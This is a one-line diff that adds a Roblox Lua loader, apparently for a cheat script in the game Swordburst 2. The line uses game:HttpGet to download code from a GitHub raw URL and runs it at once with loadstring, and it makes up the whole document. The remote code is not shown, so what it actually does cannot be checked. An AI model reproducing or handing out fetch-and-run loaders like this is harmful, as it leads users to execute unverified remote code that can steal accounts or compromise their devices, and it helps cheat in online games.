@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/wave-defense-swordburst-2-spam5-62hj77tuh05e49.lua"))()
